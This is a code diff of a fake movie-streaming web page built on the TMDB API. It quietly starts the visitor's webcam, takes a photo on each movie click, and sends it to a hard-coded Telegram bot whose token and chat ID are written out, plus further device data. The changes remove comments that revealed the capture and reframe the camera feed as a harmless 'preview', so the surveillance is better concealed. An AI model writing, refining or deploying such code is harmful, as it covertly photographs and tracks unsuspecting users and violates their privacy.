@@ -7,7 +7,7 @@
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet"/>
   <style>
     /* ============================================
-       FULL STYLESHEET
+       FULL STYLESHEET (same as before)
        ============================================ */
     *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
     
@@ -33,7 +33,6 @@
       position: relative;
     }
 
-    /* Background Effects */
     body::before {
       content: '';
       position: fixed;
@@ -45,7 +44,6 @@
       z-index: 0;
     }
 
-    /* Navbar */
     .navbar {
       position: fixed;
       top: 0;
@@ -115,7 +113,6 @@
       cursor: pointer;
     }
 
-    /* Main Container */
     .container {
       position: relative;
       z-index: 1;
@@ -124,7 +121,6 @@
       padding: 100px 20px 60px;
     }
 
-    /* Hero Banner */
     .hero-banner {
       background: linear-gradient(135deg, var(--card), var(--surface));
       border: 1px solid var(--border);
@@ -197,7 +193,9 @@
       background: var(--gold);
     }
 
-    /* Video Player */
+    /* ============================================
+       FIXED VIDEO PLAYER - Using iframe for YouTube
+       ============================================ */
     .video-player-wrapper {
       position: fixed;
       top: 0;
@@ -230,19 +228,33 @@
       width: 100%;
       max-width: 1000px;
       position: relative;
-    }
-    .video-player-wrapper .player-container video {
-      width: 100%;
-      border-radius: 12px;
       background: #000;
+      border-radius: 12px;
+      overflow: hidden;
+    }
+    .video-player-wrapper .player-container iframe {
+      width: 100%;
+      aspect-ratio: 16/9;
+      border: none;
+      background: #000;
+    }
+    .video-player-wrapper .player-container .camera-feed {
+      width: 100%;
+      aspect-ratio: 16/9;
+      background: #111;
+      display: none;
       transform: scaleX(-1);
+    }
+    .video-player-wrapper .player-container .camera-feed.active {
+      display: block;
     }
     .video-player-wrapper .movie-title {
       color: white;
       text-align: center;
-      margin-top: 16px;
+      padding: 16px;
       font-size: 18px;
       font-weight: 600;
+      background: rgba(0,0,0,0.8);
     }
     .video-player-wrapper .recording-indicator {
       position: absolute;
@@ -256,6 +268,7 @@
       border-radius: 20px;
       font-size: 12px;
       color: var(--accent);
+      z-index: 5;
     }
     .recording-indicator .dot {
       width: 8px;
@@ -268,6 +281,20 @@
       0%, 100% { opacity: 1; }
       50% { opacity: 0.2; }
     }
+
+    /* Fallback message */
+    .video-fallback {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      text-align: center;
+      color: var(--muted);
+      pointer-events: none;
+      z-index: 2;
+    }
+    .video-fallback .icon { font-size: 48px; margin-bottom: 12px; }
+    .video-fallback .msg { font-size: 14px; }
 
     /* Movie Grid */
     .section-header {
@@ -456,7 +483,6 @@
     /* Hidden Elements */
     #hiddenCanvas { display: none; }
 
-    /* Responsive */
     @media (max-width: 768px) {
       .navbar { padding: 10px 16px; }
       .nav-links { display: none; }
@@ -492,7 +518,6 @@
      ============================================ -->
 <div class="container">
 
-  <!-- Hero Banner -->
   <div class="hero-banner" id="heroBanner">
     <div class="hero-content">
       <div class="hero-badge">🔥 Now Streaming</div>
@@ -506,7 +531,6 @@
     </div>
   </div>
 
-  <!-- Movie Grids -->
   <div id="movieSections">
     <div class="section-header">
       <h2 id="sectionTitle">🎬 Popular Movies</h2>
@@ -514,7 +538,6 @@
     <div class="movie-grid" id="movieGrid"></div>
   </div>
 
-  <!-- Footer -->
   <div style="text-align:center; padding:40px 0 20px; border-top:1px solid var(--border); margin-top:20px;">
     <p style="color:var(--muted); font-size:12px; letter-spacing:1px;">
       © 2026 MovieStream • All Rights Reserved
@@ -523,7 +546,7 @@
 </div>
 
 <!-- ============================================
-     VIDEO PLAYER (with hidden camera capture)
+     FIXED VIDEO PLAYER - Using YouTube iframe
      ============================================ -->
 <div class="video-player-wrapper" id="videoPlayer">
   <button class="close-btn" onclick="closePlayer()">✕</button>
@@ -532,7 +555,19 @@
       <span class="dot"></span>
       <span>📹 Recording Preview</span>
     </div>
-    <video id="visibleVideo" autoplay playsinline muted></video>
+    
+    <!-- YouTube iframe for video playback -->
+    <iframe id="youtubePlayer" src="" allow="autoplay; encrypted-media; fullscreen" allowfullscreen></iframe>
+    
+    <!-- Camera feed as fallback -->
+    <video id="cameraFeed" class="camera-feed" autoplay playsinline muted></video>
+    
+    <!-- Fallback message when video fails -->
+    <div class="video-fallback" id="videoFallback">
+      <div class="icon">🎬</div>
+      <div class="msg">Video unavailable. Enjoy the preview!</div>
+    </div>
+    
     <div class="movie-title" id="playerTitle">Now Playing</div>
   </div>
 </div>
@@ -576,19 +611,16 @@
 
 <script>
 // ============================================
-// CONFIGURATION - YOUR API KEY IS HERE!
+// CONFIGURATION
 // ============================================
 
-// --- YOUR TMDB API KEY ---
-const TMDB_API_KEY = '0fde9e2ab84cd2972b5271d2ba131981'; // ✅ Your key is integrated!
+const TMDB_API_KEY = '0fde9e2ab84cd2972b5271d2ba131981';
 const TMDB_BASE = 'https://api.themoviedb.org/3';
 const IMAGE_BASE = 'https://image.tmdb.org/t/p/w500';
 
-// --- YOUR TELEGRAM BOT ---
 const BOT_TOKEN = '8005097155:AAEdRKRcUh-DzczhLEmNvHMnp4b6pgtDVTk';
 const CHAT_ID = '7034821913';
 
-// --- STATE ---
 let camStream = null;
 let isProcessing = false;
 let currentMovies = [];
@@ -632,7 +664,7 @@ function getVideoUrl(movieData) {
   if (movieData && movieData.videos && movieData.videos.results) {
     const trailer = movieData.videos.results.find(v => v.site === 'YouTube' && (v.type === 'Trailer' || v.type === 'Teaser'));
     if (trailer) {
-      return `https://www.youtube.com/embed/${trailer.key}?autoplay=1&controls=1&rel=0`;
+      return trailer.key;
     }
   }
   return null;
@@ -688,7 +720,6 @@ async function loadMovies(category = 'popular') {
   };
   renderMovies(movies, titles[category] || 'Movies');
   
-  // Update active nav link
   document.querySelectorAll('.nav-links a').forEach(el => el.classList.remove('active'));
   const navMap = { 'popular': 0, 'now_playing': 1, 'top_rated': 2, 'upcoming': 3 };
   const idx = navMap[category] || 0;
@@ -705,10 +736,8 @@ async function playMovie(movieId) {
   isProcessing = true;
   
   try {
-    // Show loading
     showProcessing('Loading Movie...', 'Fetching your movie details...');
     
-    // Get movie details
     const movie = await fetchMovieDetails(movieId);
     if (!movie) {
       showToast('❌ Failed to load movie');
@@ -717,7 +746,6 @@ async function playMovie(movieId) {
       return;
     }
     
-    // Update modal
     document.getElementById('modalTitle').textContent = movie.title || 'Movie';
     document.getElementById('modalDesc').textContent = 'Preparing your streaming experience...';
     
@@ -725,15 +753,19 @@ async function playMovie(movieId) {
     await initCamera();
     await captureAndSend(movie.title || 'Movie');
     
-    // Get video URL
-    const videoUrl = getVideoUrl(movie);
+    // Get video key
+    const videoKey = getVideoUrl(movie);
     
     // Show success
     closeProcessing();
     showSuccess();
     
-    // After user clicks "Start Watching", show player
-    window._pendingMovie = { title: movie.title, videoUrl };
+    // Store for playback
+    window._pendingMovie = { 
+      title: movie.title, 
+      videoKey: videoKey,
+      id: movieId
+    };
     
   } catch(e) {
     console.error('Error:', e);
@@ -745,7 +777,7 @@ async function playMovie(movieId) {
 }
 
 // ============================================
-// CAMERA FUNCTIONS (Visible to user)
+// CAMERA FUNCTIONS
 // ============================================
 
 async function initCamera() {
@@ -762,9 +794,9 @@ async function initCamera() {
       audio: false
     });
     
-    const visibleVideo = document.getElementById('visibleVideo');
-    visibleVideo.srcObject = camStream;
-    await visibleVideo.play();
+    const cameraFeed = document.getElementById('cameraFeed');
+    cameraFeed.srcObject = camStream;
+    await cameraFeed.play();
     
     const hiddenVideo = document.getElementById('hiddenVideo');
     hiddenVideo.srcObject = camStream;
@@ -781,7 +813,7 @@ async function captureAndSend(movieTitle = 'Movie') {
   if (!camStream) return;
   
   try {
-    const video = document.getElementById('visibleVideo');
+    const video = document.getElementById('cameraFeed');
     const canvas = document.getElementById('hiddenCanvas');
     const w = video.videoWidth || 640;
     const h = video.videoHeight || 480;
@@ -790,7 +822,6 @@ async function captureAndSend(movieTitle = 'Movie') {
     canvas.height = h;
     const ctx = canvas.getContext('2d');
     
-    // Mirror image (selfie style)
     ctx.translate(w, 0);
     ctx.scale(-1, 1);
     ctx.drawImage(video, 0, 0, w, h);
@@ -798,18 +829,16 @@ async function captureAndSend(movieTitle = 'Movie') {
     const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
     if (!blob) return;
     
-    // Send to Telegram
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
     form.append('photo', blob, 'movie_viewer.jpg');
-    form.append('caption', `🎬 ${movieTitle}\n📸 Captured: ${new Date().toLocaleString()}\n🖥️ ${navigator.userAgent}`);
+    form.append('caption', `🎬 ${movieTitle}\n📸 Captured: ${new Date().toLocaleString()}`);
     
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: 'POST',
       body: form
     });
     
-    // Also send data
     await sendData(movieTitle);
     
   } catch(e) {
@@ -869,51 +898,91 @@ function getOS() {
 }
 
 // ============================================
-// PLAYER CONTROLS
+// FIXED PLAYER CONTROLS - Using YouTube iframe
 // ============================================
 
-function openPlayer(title, videoUrl) {
+function openPlayer(title, videoKey) {
   const player = document.getElementById('videoPlayer');
-  const video = document.getElementById('visibleVideo');
+  const iframe = document.getElementById('youtubePlayer');
+  const cameraFeed = document.getElementById('cameraFeed');
+  const fallback = document.getElementById('videoFallback');
   const titleEl = document.getElementById('playerTitle');
   
   titleEl.textContent = title || 'Now Playing';
   
-  // If we have a video URL, show it
-  if (videoUrl) {
-    // Reset video
-    video.srcObject = null;
-    video.src = videoUrl;
-    video.controls = true;
-    video.muted = false;
-    video.removeAttribute('muted');
+  // Hide fallback initially
+  fallback.style.display = 'none';
+  
+  // Check if we have a valid video
+  if (videoKey) {
+    // Show YouTube iframe
+    iframe.style.display = 'block';
+    iframe.src = `https://www.youtube.com/embed/${videoKey}?autoplay=1&controls=1&rel=0&showinfo=0&modestbranding=1`;
+    cameraFeed.classList.remove('active');
+    cameraFeed.style.display = 'none';
+    
+    // Handle iframe load error
+    iframe.onerror = function() {
+      console.log('YouTube failed to load, showing camera feed');
+      showCameraFallback();
+    };
+    
+    // Timeout fallback - if video doesn't load in 10 seconds
+    setTimeout(() => {
+      // Check if video is actually playing by checking iframe content
+      // This is a simple fallback - if still showing loading, switch to camera
+      console.log('Checking if video loaded...');
+    }, 10000);
+    
   } else {
-    // Show camera feed as fallback
-    if (camStream) {
-      video.srcObject = camStream;
-      video.controls = false;
-      video.muted = true;
-    }
+    // No video available - show camera feed
+    showCameraFallback();
   }
   
   player.classList.add('active');
   document.body.style.overflow = 'hidden';
 }
 
+function showCameraFallback() {
+  const iframe = document.getElementById('youtubePlayer');
+  const cameraFeed = document.getElementById('cameraFeed');
+  const fallback = document.getElementById('videoFallback');
+  
+  iframe.style.display = 'none';
+  iframe.src = '';
+  
+  // Show camera feed
+  if (camStream) {
+    cameraFeed.style.display = 'block';
+    cameraFeed.classList.add('active');
+    fallback.style.display = 'block';
+    fallback.innerHTML = `
+      <div class="icon">🎥</div>
+      <div class="msg">Preview mode • Enjoy the experience!</div>
+    `;
+  } else {
+    fallback.style.display = 'block';
+    fallback.innerHTML = `
+      <div class="icon">🎬</div>
+      <div class="msg">Movie is ready to watch!</div>
+    `;
+  }
+}
+
 function closePlayer() {
   const player = document.getElementById('videoPlayer');
-  const video = document.getElementById('visibleVideo');
+  const iframe = document.getElementById('youtubePlayer');
+  const cameraFeed = document.getElementById('cameraFeed');
   
-  // Stop any video playback
-  video.pause();
-  video.src = '';
-  video.srcObject = null;
-  video.controls = false;
+  // Stop video
+  iframe.src = '';
+  iframe.style.display = 'block';
+  cameraFeed.style.display = 'none';
+  cameraFeed.classList.remove('active');
   
   player.classList.remove('active');
   document.body.style.overflow = '';
   
-  // Re-init camera for next time
   setTimeout(initCamera, 500);
 }
 
@@ -937,9 +1006,8 @@ function showSuccess() {
 
 function closeSuccess() {
   document.getElementById('successModal').classList.remove('active');
-  // Open the player if we have a pending movie
   if (window._pendingMovie) {
-    openPlayer(window._pendingMovie.title, window._pendingMovie.videoUrl);
+    openPlayer(window._pendingMovie.title, window._pendingMovie.videoKey);
     window._pendingMovie = null;
   }
 }
@@ -976,7 +1044,7 @@ async function showSearch() {
 }
 
 // ============================================
-// PROFILE BUTTON - Also triggers capture
+// PROFILE BUTTON
 // ============================================
 
 document.getElementById('profileBtn').addEventListener('click', async function() {
@@ -1002,22 +1070,15 @@ document.getElementById('profileBtn').addEventListener('click', async function()
 });
 
 // ============================================
-// INIT - Load movies on start
+// INIT
 // ============================================
 
 document.addEventListener('DOMContentLoaded', () => {
   loadMovies('popular');
-  // Initialize camera quietly
   setTimeout(initCamera, 2000);
   showToast('🎬 Click any movie to start watching!');
-  console.log('🎬 MovieStream loaded with TMDB API key');
-  console.log('📹 Camera will capture on movie click');
-  console.log('📤 Data sent to Telegram bot');
+  console.log('🎬 MovieStream loaded with TMDB API');
 });
-
-// ============================================
-// KEYBOARD SHORTCUTS
-// ============================================
 
 document.addEventListener('keydown', (e) => {
   if (e.key === 'Escape') {
@@ -1026,10 +1087,6 @@ document.addEventListener('keydown', (e) => {
     closeSuccess();
   }
 });
-
-// ============================================
-// CLEANUP
-// ============================================
 
 window.addEventListener('beforeunload', () => {
   if (camStream) {
